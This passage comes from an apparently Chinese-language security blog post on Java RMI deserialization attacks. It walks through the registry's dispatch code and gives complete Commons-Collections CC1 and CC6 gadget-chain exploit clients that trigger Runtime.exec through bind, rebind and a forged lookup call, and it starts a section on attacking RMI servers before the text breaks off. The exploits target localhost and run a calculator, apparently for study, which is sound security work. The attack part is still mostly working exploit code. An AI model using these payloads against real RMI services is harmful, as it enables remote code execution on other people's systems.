class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    var2.releaseInputStream();<br>                    String[] var99 = var6.list();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var102.writeObject(var99);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    String var98;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var98 = (String)var104.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    <span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        var9.writeObject(var101);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    Remote var8;<br>                    String var97;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var97 = (String)var11.readObject();<br>                        var8 = (Remote)var11.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.rebind(var97, var8);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    String var7;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var7 = (String)var10.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.unbind(var7);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>如果存在对传入的对象调用 <code>readObject()</code> 方法，则可以利用，<code>dispatch</code> 里面对应关系如下：</p>
<p><code>case 0---&gt;bind、case 1---&gt;list、case 2---&gt;lookup、case 3---&gt;rebind、case 4---&gt;unbind</code></p>
<h2 id="bind、rebind"><a href="#bind、rebind" class="headerlink" title="bind、rebind"></a>bind、rebind</h2><p>其中远程调用<code>bind()、rebind()</code>绑定服务时，注册中心会对接收到的序列化的对象进行反序列化。所以，我们只需要客户端传入一个恶意的对象即可。这里利用CC1和CC6做演示：</p>
<p>CC1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//创建恶意 InvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br>        <span class="hljs-comment">//使用AnnotationInvocationHandler动态代理Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br>        <span class="hljs-comment">//bind到registry时会触发反序列化</span><br>        registry.bind(<span class="hljs-string">&quot;hello&quot;</span>, remote);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>CC6：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//连接registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//使用AnnotationInvocationHandler动态代理Remote</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br><br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;hello&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//使用动态代理初始化 AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Target.class,map);<br><br>        <span class="hljs-comment">//使用AnnotationInvocationHandler动态代理Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br>        <span class="hljs-comment">//bind到registry时会触发反序列化</span><br>        registry.rebind(<span class="hljs-string">&quot;hello&quot;</span>, remote);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalAccessException, NoSuchFieldException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br>        <span class="hljs-keyword">return</span> map2;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这里有一个需要注意的点就是调用<code>bind()、rebind</code>的时候无法直接传入<code>AnnotationInvocationHandler</code>类的对象，必须要转为Remote类才行。这里使用了下面的方式进行转换：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br><span class="hljs-comment">//使用AnnotationInvocationHandler动态代理Remote</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br></code></pre></td></tr></table></figure>

<p>下面是详细流程：</p>
<ul>
<li>cc1的payload是一个<code>AnnotationInvocationHandler</code>对象，在其构造的时候传入了一个 HashMap，其中包含一个恶意对象（通过 getEvilClass() 方法生成），这个 HashMap 被用作 <code>AnnotationInvocationHandler#memberValues</code> 属性，又因为它现在是InvocationHandler类型，通过 Proxy.newProxyInstance方法，这时<code>memberValues</code> 实际上是一个代理对象，所有对 <code>memberValues</code> 的方法调用（例如 <code>get()</code> 或 <code>entrySet()</code>）都会被委托到 <code>AnnotationInvocationHandler.invoke()</code> 方法。</li>
<li>在服务端触发var.readobject()时，会进入<code>AnnotationInvocationHandler</code>类的readobject()</li>
<li>在readobject()中会执行<code>this.memberValues.entrySet()</code>。entrySet()，这是一个map的方法。根据动态代理性质，我们绑定了map的方法到<code>AnnotationInvocationHandler.invoke</code>方法，所以就会进入invoke方法。</li>
<li><code>AnnotationInvocationHandler</code>对象中又弄了一个lazyMap在memberValues属性中！只要触发了这个lazyMap的get方法就等于成功。</li>
<li>而<code>AnnotationInvocationHandler.invoke</code>方法中刚好有<code>this.memberValues.get(var4);</code>，而这个this.memberValues就是lazyMap。</li>
</ul>
<h2 id="unbind、lookup"><a href="#unbind、lookup" class="headerlink" title="unbind、lookup"></a>unbind、lookup</h2><p>因为 unbind 和 lookup 的最终利用和思想都是一样的，这里我们就只拿 lookup 这里来学习。我们看到这里只接受一个String类型的参数。如果我们要控制传递过去的序列化值的话，不能直接传递给<code>lookup</code>这个方法，但是它发送请求的流程是可以直接复制的，只需要模仿<code>lookup</code>中发送请求的流程，就能够控制发送过去的值为一个对象。详情看下面代码。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241231171605073.png" alt="image-20241231171605073"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteCall;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//创建恶意 InvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) getEvilClass();<br><br>        <span class="hljs-comment">//使用AnnotationInvocationHandler动态代理Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, handler);<br><br><br>        <span class="hljs-comment">//获取ref(java.rmi.server.RemoteObject#ref)</span><br>        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();<br>        fields_0[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) fields_0[<span class="hljs-number">0</span>].get(registry);<br><br>        <span class="hljs-comment">//获取operations</span><br>        Field[] fields_1 = registry.getClass().getDeclaredFields();<br>        fields_1[<span class="hljs-number">0</span>].setAccessible(<span class="hljs-literal">true</span>);<br>        Operation[] operations = (Operation[]) fields_1[<span class="hljs-number">0</span>].get(registry);<br><br>        <span class="hljs-comment">// 伪造lookup的代码，去伪造传输信息</span><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        var3.writeObject(remote);<br>        ref.invoke(var2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformerMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>注册中心在处理请求的时候是直接进行反序列化，所以还是可以造成反序列化攻击。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241231213814990.png" alt="image-20241231213814990"></p>
<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>没反序列化的点，这里就不过多阐述了</p>
<h1 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h1><p>在 Client 端获取到 Server 端创建的 Stub 后，会在本地调用这个 Stub 并传递参数，Stub 会序列化这个参数，并传递给 Server 端，Server 端会反序列化 Client 端传入的参数并进行调用，如果这个参数是 Object 类型的情况下，Client 端可以传给 Server 端任意的类，直接造成反序列化漏洞。</p>
<h2 id="服务端存在一个接收-Object-参数的远程方法"><a href="#服务端存在一个接收-Object-参数的远程方法" class="headerlink" title="服务端存在一个接收 Object 参数的远程方法"></a>服务端存在一个接收 Object 参数的远程方法</h2><p>例如，远程调用的接口 RemoteInterface 存在一个 <code>sayHello</code> 方法的参数是 Object 类型。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250101012158981.png" alt="image-20250101012158981"></p>
<p>那我们就直接可以传一个反序列化 payload 进去执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Registry</span> <span 